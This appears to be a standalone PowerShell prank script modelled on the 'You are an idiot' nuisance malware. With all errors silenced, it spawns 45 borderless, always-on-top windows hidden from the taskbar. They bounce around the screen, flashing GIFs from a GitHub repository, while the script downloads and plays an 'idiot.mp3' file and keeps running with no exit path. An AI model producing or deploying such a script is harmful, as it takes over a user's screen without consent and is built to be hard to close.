$ErrorActionPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'

$GifUrl1 = "https://raw.githubusercontent.com/Aas6d54asd/XD/refs/heads/main/white2.gif"
$GifUrl2 = "https://raw.githubusercontent.com/Aas6d54asd/XD/refs/heads/main/black2.gif"

$PocetOken = 45
$Sirka = 352
$Vyska = 264
$PrepinaniInterval = 1
$BaseRychlost = 25

$MusicUrl = "https://github.com/Aas6d54asd/XD/raw/refs/heads/main/idiot.mp3"
$tmp = "$env:TEMP\song.mp3"

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$forms = @()
$timers = @()
$switchTimers = @()

$screen = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea
$TransparentColor = [System.Drawing.Color]::Magenta

for ($i = 1; $i -le $PocetOken; $i++) {
    $form = New-Object System.Windows.Forms.Form
    $form.Text = " "
    $form.Size = New-Object System.Drawing.Size($Sirka, $Vyska)
    $form.StartPosition = "Manual"
    $form.FormBorderStyle = "None"
    $form.TopMost = $true
    $form.BackColor = $TransparentColor
    $form.TransparencyKey = $TransparentColor
    $form.ShowInTaskbar = $false
    $form.Padding = New-Object System.Windows.Forms.Padding(0,0,0,0)
    $form.ClientSize = New-Object System.Drawing.Size($Sirka, $Vyska)

    $wb = New-Object System.Windows.Forms.WebBrowser
    $wb.Location = New-Object System.Drawing.Point(0, 0)
    $wb.Size = New-Object System.Drawing.Size($Sirka, $Vyska)
    $wb.ScrollBarsEnabled = $false
    $wb.IsWebBrowserContextMenuEnabled = $false
    $wb.ScriptErrorsSuppressed = $true
    $wb.BorderStyle = "None"
    $form.Controls.Add($wb)

    $form.Left = Get-Random -Minimum 0 -Maximum ($screen.Width - $Sirka)
    $form.Top = Get-Random -Minimum 0 -Maximum ($screen.Height - $Vyska)

    $state = [PSCustomObject]@{
        DirectionX = if ((Get-Random -Minimum 0 -Maximum 2) -eq 0) { -1 } else { 1 }
        DirectionY = if ((Get-Random -Minimum 0 -Maximum 2) -eq 0) { -1 } else { 1 }
        SpeedX     = (Get-Random -Minimum 1 -Maximum 3) * $BaseRychlost
        SpeedY     = (Get-Random -Minimum 1 -Maximum 3) * $BaseRychlost
        ChangeProb = 0.03
        CurrentGif = 1
        WebBrowser = $wb
    }

    $timer = New-Object System.Windows.Forms.Timer
    $timer.Interval = 1
    $timer.Add_Tick({
        $st = $state
        $newX = $form.Left + ($st.DirectionX * $st.SpeedX)
        $newY = $form.Top + ($st.DirectionY * $st.SpeedY)

        if ($newX -le 0 -or $newX + $form.Width -ge $screen.Width) { 
            $st.DirectionX = -$st.DirectionX
            if ((Get-Random -Maximum 100) -lt 40) { $st.SpeedX = (Get-Random -Minimum 1 -Maximum 3) * $BaseRychlost }
        }
        if ($newY -le 0 -or $newY + $form.Height -ge $screen.Height) { 
            $st.DirectionY = -$st.DirectionY
            if ((Get-Random -Maximum 100) -lt 40) { $st.SpeedY = (Get-Random -Minimum 1 -Maximum 3) * $BaseRychlost }
        }

        if ((Get-Random -Maximum 1000) -lt ($st.ChangeProb * 1000)) { $st.DirectionX = if ((Get-Random -Minimum 0 -Maximum 2) -eq 0) { -1 } else { 1 } }
        if ((Get-Random -Maximum 1000) -lt ($st.ChangeProb * 1000)) { $st.DirectionY = if ((Get-Random -Minimum 0 -Maximum 2) -eq 0) { -1 } else { 1 } }

        $form.Left = [Math]::Max(0, [Math]::Min($newX, $screen.Width - $form.Width))
        $form.Top  = [Math]::Max(0, [Math]::Min($newY, $screen.Height - $form.Height))
    }.GetNewClosure())

    $switchTimer = New-Object System.Windows.Forms.Timer
    $switchTimer.Interval = $PrepinaniInterval * 1000
    $switchTimer.Add_Tick({
        $st = $state
        $st.CurrentGif = if ($st.CurrentGif -eq 1) { 2 } else { 1 }
        $newUrl = if ($st.CurrentGif -eq 1) { $GifUrl1 } else { $GifUrl2 }
        $st.WebBrowser.Navigate($newUrl)
    }.GetNewClosure())

    $wb.Add_DocumentCompleted({
        if ($wb.Document -ne $null -and $wb.Document.Body -ne $null) {
            $wb.Document.Body.Style = "margin:0; padding:0; border:0; overflow:hidden;"
        }
    }.GetNewClosure())

    $wb.Navigate($GifUrl1)

    $forms += $form
    $timers += $timer
    $switchTimers += $switchTimer
}

foreach ($form in $forms) { $form.Show() }
foreach ($timer in $timers) { $timer.Start() }
foreach ($stimer in $switchTimers) { $stimer.Start() }

try {
    iwr $MusicUrl -OutFile $tmp
    $MediaPlayer = [Windows.Media.Playback.MediaPlayer, Windows.Media, ContentType = WindowsRuntime]::New()
    $MediaPlayer.Source = [Windows.Media.Core.MediaSource]::CreateFromUri($tmp)
    $MediaPlayer.Play()
} catch {}

$null = [System.Windows.Forms.Application]::Run()
